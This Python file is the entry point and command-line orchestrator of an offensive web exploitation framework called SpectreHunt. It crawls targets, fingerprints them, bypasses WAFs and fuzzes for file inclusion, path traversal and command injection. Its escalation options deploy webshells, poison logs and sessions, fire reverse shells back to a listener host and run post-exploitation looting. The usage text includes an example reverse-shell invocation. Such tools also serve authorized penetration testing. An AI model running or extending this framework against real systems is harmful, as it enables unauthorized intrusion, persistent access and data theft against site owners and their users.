#!/usr/bin/env python3
"""
SpectreHunt :: main.py
Entry point, CLI, phased orchestration.

Author : Inayat Hussain  (Red Team Operator / Offensive Security Researcher)
"""

from __future__ import annotations

import argparse
import os
import sys
from datetime import datetime

import requests
from requests.adapters import HTTPAdapter
from requests.packages import urllib3

from config import (
    AUTHOR, AUTHOR_ROLE, BANNER, BANNER_META, C, DEFAULT_CRAWL_THREADS,
    DEFAULT_DEPTH, DEFAULT_HEADERS, DEFAULT_LPORT_RFI, DEFAULT_MAX_BRUTE_PARAMS,
    DEFAULT_MAX_JOBS, DEFAULT_MAX_URLS, DEFAULT_RATE_LIMIT, DEFAULT_SHELL_TIMEOUT,
    DEFAULT_THREADS, DEFAULT_TIMEOUT, DEFAULT_TIMING_DELAY, REPORT_DIR,
    SEVERITY_RANK, TOOL_NAME, VALID_OS, VALID_RENDER, VALID_STACKS, VERSION,
    paint, strip_ansi,
)
from core import ui
from core.chain import ExploitChainer
from core.crawler import Crawler
from core.fingerprinter import Fingerprinter
from core.fuzzer import Fuzzer
from core.waf_bypasser import WAFBypasser
from utils.callback import CallbackServer
from utils.parser import extract_query_params

urllib3.disable_warnings()

VALID_TYPES = ("lfi", "rfi", "rce", "traversal")
PHASES = 6
_report_lines: list = []


def emit(line: str) -> None:
    print(line, flush=True)
    _report_lines.append(strip_ansi(line))


def normalize_target(target: str) -> str:
    target = target.strip()
    if not target:
        return target
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    return target.rstrip("/")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="spectrehunt",
        description=f"{TOOL_NAME} v{VERSION} -- LFI / RFI / RCE / Path Traversal / "
                    f"Command Injection framework by {AUTHOR}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "recon + fuzz:\n"
            "  spectrehunt https://target.com --depth 3 --max-jobs 800\n"
            "  spectrehunt --list urls.txt --no-crawl -t traversal rce\n"
            "  spectrehunt https://target.com -C 'PHPSESSID=abc' --rate-limit 0.3\n"
            "\n"
            "escalation:\n"
            "  spectrehunt https://target.com -t lfi --filter-chain --poison\n"
            "  spectrehunt https://target.com -t rce --deploy-webshell --loot\n"
            "  spectrehunt https://target.com -t rce --shell --lhost 10.10.14.5\n"
        ),
    )
    p.add_argument("target", nargs="?")
    p.add_argument("-w", "--wordlist", help="Custom payload wordlist")
    p.add_argument("-t", "--types", nargs="+", choices=VALID_TYPES,
                   default=list(VALID_TYPES))
    p.add_argument("--list", dest="target_list", help="File of URLs, one per line")
    p.add_argument("--no-crawl", action="store_true",
                   help="Fuzz exactly the URLs given, do not crawl")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--depth", type=int, default=DEFAULT_DEPTH)
    p.add_argument("--max-urls", type=int, default=DEFAULT_MAX_URLS)
    p.add_argument("--threads", type=int, default=DEFAULT_THREADS)
    p.add_argument("--crawl-threads", type=int, default=DEFAULT_CRAWL_THREADS)
    p.add_argument("--max-jobs", type=int, default=DEFAULT_MAX_JOBS, help="0 = unlimited")
    p.add_argument("--max-brute-params", type=int, default=DEFAULT_MAX_BRUTE_PARAMS)
    p.add_argument("--stack", choices=VALID_STACKS, default="auto")
    p.add_argument("--os", dest="os_family", choices=VALID_OS, default="auto")

    p.add_argument("-C", "--cookie", help="Raw Cookie header for authenticated scans")
    p.add_argument("-H", "--header", action="append", default=[],
                   metavar="Name: Value", help="Extra header (repeatable)")
    p.add_argument("-A", "--user-agent", help="Override User-Agent")

    p.add_argument("--render", choices=VALID_RENDER, default="auto")
    p.add_argument("--no-probe", action="store_true")
    p.add_argument("--no-path-segments", action="store_true")
    p.add_argument("--no-json", action="store_true")
    p.add_argument("--no-timing", action="store_true")
    p.add_argument("--timing-delay", type=int, default=DEFAULT_TIMING_DELAY)
    p.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT)

    g = p.add_argument_group("escalation (off by default)")
    g.add_argument("--filter-chain", action="store_true",
                   help="Force the php://filter chain RCE attempt")
    g.add_argument("--poison", action="store_true",
                   help="Try log / environ / session file poisoning")
    g.add_argument("--deploy-webshell", action="store_true")
    g.add_argument("--shell", action="store_true",
                   help="Fire reverse shells and wait for a callback")
    g.add_argument("--loot", action="store_true",
                   help="Run the post-exploitation command set")
    g.add_argument("--lhost", help="IP the target calls back to (default: auto)")
    g.add_argument("--lport", type=int, default=0, help="Shell port, 0 = free")
    g.add_argument("--shell-timeout", type=int, default=DEFAULT_SHELL_TIMEOUT)

    p.add_argument("--lport-rfi", type=int, default=DEFAULT_LPORT_RFI)
    p.add_argument("--no-callback", action="store_true")
    p.add_argument("--no-brute-params", action="store_true")
    p.add_argument("--no-chain", action="store_true")
    p.add_argument("--debug", action="store_true",
                   help="Print full tracebacks instead of one-line errors")
    p.add_argument("--report", help="Write report to this path")
    return p


def build_session(args) -> requests.Session:
    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)
    if args.user_agent:
        session.headers["User-Agent"] = args.user_agent
    if args.cookie:
        session.headers["Cookie"] = args.cookie
    for raw in args.header or []:
        if ":" in raw:
            name, _, value = raw.partition(":")
            session.headers[name.strip()] = value.strip()
    adapter = HTTPAdapter(pool_connections=32, pool_maxsize=32, max_retries=2)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    return session


def load_wordlist(path: str) -> dict:
    from payloads.default import PAYLOADS

    custom = {k: list(v) for k, v in PAYLOADS.items()}
    if not path:
        return custom
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as handle:
            lines = [l.strip() for l in handle if l.strip() and not l.startswith("#")]
    except OSError as exc:
        ui.line(f"cannot read wordlist {path}: {exc}", (C.YELLOW,))
        return custom
    tagged = [l for l in lines if l.split(":", 1)[0] in VALID_TYPES]
    if tagged:
        custom = {k: [] for k in VALID_TYPES}
        for line in tagged:
            vtype, _, payload = line.partition(":")
            custom[vtype].append(payload.strip())
    else:
        for vtype in VALID_TYPES:
            custom[vtype] = lines + custom[vtype]
    return custom


def make_renderer(mode: str):
    from core.renderer import preflight, Renderer

    if mode == "off":
        return None
    reason = preflight()
    if reason:
        ui.line(f"render off -- {reason}", (C.DIM,))
        return None
    try:
        renderer = Renderer()
        ui.line("renderer ready (auto: SPA shells only)", (C.GREEN,))
        return renderer
    except Exception as exc:
        ui.line(f"renderer failed -- {exc}", (C.YELLOW,))
        return None


def scan_target(target: str, args, callback, renderer) -> tuple:
    ui.phase(2, PHASES, "fingerprint")
    session = build_session(args)

    info = Fingerprinter(session, args.timeout).fingerprint(target)
    ui.section("target")
    ui.kv([
        ("url", target),
        ("server", info["server"] or "unknown"),
        ("powered-by", info["powered_by"] or "unknown"),
        ("cms", (info["cms"] or "unknown")
         + (f" {info['cms_version']}" if info["cms_version"] else "")),
        ("stack", f"{info.get('stack') or 'generic'} / {info.get('os') or 'linux'}"),
        ("waf", ", ".join(info["waf"]) if info["waf"] else "none"),
    ])
    ui.end_section()
    if info.get("challenge"):
        ui.bullet("edge challenge page detected -- baselines may be noisy", (C.YELLOW,))
    for cve, desc, sev in info["cves"]:
        ui.bullet(f"{cve} [{sev}] {desc}", (C.YELLOW,))

    stack = args.stack if args.stack != "auto" else (info.get("stack") or "generic")
    os_family = args.os_family if args.os_family != "auto" else (info.get("os") or "linux")
    bypasser = WAFBypasser(info["waf"][0]) if info["waf"] else None

    ui.phase(3, PHASES, "discovery")
    if args.no_crawl:
        crawler = Crawler(session, target, timeout=args.timeout, renderer=None,
                          render_mode="off", path_segments=not args.no_path_segments,
                          probe=False)
        crawler._record(target, extract_query_params(target))
        crawler._harvest_segments(target)
        targets = crawler.targets
    else:
        crawler = Crawler(session, target, max_depth=args.depth, max_urls=args.max_urls,
                          timeout=args.timeout, threads=args.crawl_threads,
                          renderer=renderer, render_mode=args.render,
                          path_segments=not args.no_path_segments,
                          probe=not args.no_probe)
        targets = crawler.crawl()
    ui.line(crawler.summary(), (C.WHITE,))

    if not targets and not crawler.segment_targets:
        ui.line("nothing mapped -- target unreachable?", (C.YELLOW,))
        return [], []

    ui.phase(4, PHASES, "fuzz")
    fuzzer = Fuzzer(session, timeout=args.timeout, waf_bypasser=bypasser,
                    callback=callback, threads=args.threads, stack=stack,
                    os_family=os_family, base_url=target, max_jobs=args.max_jobs,
                    max_brute_params=args.max_brute_params,
                    timing=not args.no_timing, timing_delay=args.timing_delay,
                    json_mode=not args.no_json, rate_limit=args.rate_limit)
    findings = fuzzer.scan(targets, args.types, brute_params=not args.no_brute_params,
                           segment_targets=crawler.segment_targets)

    ui.phase(5, PHASES, "diagnostics")
    for line in fuzzer.diagnose(targets):
        ui.line(line, (C.DIM,))

    chains = []
    ui.phase(6, PHASES, "chain + escalation")
    if not findings:
        ui.line("nothing to chain", (C.DIM,))
    elif args.no_chain:
        ui.line("chaining disabled (--no-chain)", (C.DIM,))
    else:
        chainer = ExploitChainer(fuzzer, lhost=args.lhost, lport=args.lport,
                                 shell_timeout=args.shell_timeout)
        for finding in findings:
            ui.section(f"{finding.vtype.upper()} @ {finding.param}")
            steps = chainer.chain(finding, do_shell=args.shell,
                                  do_webshell=args.deploy_webshell,
                                  do_poison=args.poison, do_loot=args.loot,
                                  do_filter=args.filter_chain)
            for step in steps:
                ui.step(step["status"], step["step"], step.get("detail", ""),
                        step.get("payload", ""))
            ui.end_section()
            chains.append((finding, steps))
    return findings, chains


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    print(paint(BANNER, C.ACCENT))
    for i, meta in enumerate(BANNER_META):
        if not meta:
            print()
            continue
        if i == 0:
            print(paint("        " + meta, C.WHITE, C.BOLD))
        elif i == 1:
            print(paint("        " + meta, C.ACCENT2))
        else:
            print(paint("        " + meta, C.GREY))

    targets = []
    if args.target_list:
        try:
            with open(args.target_list, "r", encoding="utf-8", errors="ignore") as h:
                targets += [l.strip() for l in h if l.strip() and not l.startswith("#")]
        except OSError as exc:
            parser.error(f"cannot read target list: {exc}")
    if args.target:
        targets.append(args.target)
    targets = [normalize_target(t) for t in targets if t.strip()]
    if not targets:
        parser.error("provide a target or --list")

    ui.phase(1, PHASES, "setup")
    renderer = None if args.no_crawl else make_renderer(args.render)

    callback_server = None
    callback = None
    if "rfi" in args.types and not args.no_callback:
        try:
            callback_server = CallbackServer(args.lport_rfi, args.lhost)
            callback = callback_server.start()
            ui.line(f"RFI callback on {callback}", (C.GREEN,))
        except OSError as exc:
            ui.line(f"RFI callback unavailable -- {exc}", (C.YELLOW,))

    all_findings, all_chains = [], []
    try:
        for target in targets:
            try:
                findings, chains = scan_target(target, args, callback, renderer)
            except Exception as exc:
                if args.debug:
                    import traceback
                    traceback.print_exc()
                ui.line(f"target failed: {exc.__class__.__name__}: {exc}", (C.RED,))
                continue
            all_findings += findings
            all_chains += chains
    except KeyboardInterrupt:
        ui.line("interrupted", (C.YELLOW,))

    print()
    ui.title()
    if all_findings:
        ui.line(f"{len(all_findings)} confirmed finding(s)", (C.RED, C.BOLD))
        for f in sorted(all_findings, key=lambda x: SEVERITY_RANK.get(x.severity, 9)):
            ui.finding_card(f)
    else:
        ui.line("no vulnerabilities confirmed", (C.YELLOW,))

    if callback_server:
        if callback_server.hits:
            ui.line(f"RFI callback hit {len(callback_server.hits)} time(s)", (C.GREEN,))
        callback_server.stop()
    if renderer:
        renderer.close()

    counts = {}
    for f in all_findings:
        counts[f.vtype] = counts.get(f.vtype, 0) + 1
    summary = "  ".join(f"{k.upper()} {v}" for k, v in counts.items()) or "clean"
    print()
    ui.line(f"complete :: {summary}", (C.BOLD,))
    ui.line(f"{TOOL_NAME} v{VERSION} · {AUTHOR} · {AUTHOR_ROLE}", (C.DIM,))
    ui.title()

    if args.report:
        os.makedirs(os.path.dirname(args.report) or ".", exist_ok=True)
        header = [f"{TOOL_NAME} v{VERSION} report",
                  f"Author: {AUTHOR} ({AUTHOR_ROLE})",
                  f"Date: {datetime.now().isoformat(timespec='seconds')}",
                  f"Targets: {', '.join(targets)}", ""]
        with open(args.report, "w", encoding="utf-8") as h:
            h.write("\n".join(header + _report_lines) + "\n")
        ui.line(f"report -> {args.report}", (C.GREEN,))
    else:
        os.makedirs(REPORT_DIR, exist_ok=True)

    return 1 if all_findings else 0


if __name__ == "__main__":
    sys.exit(main())
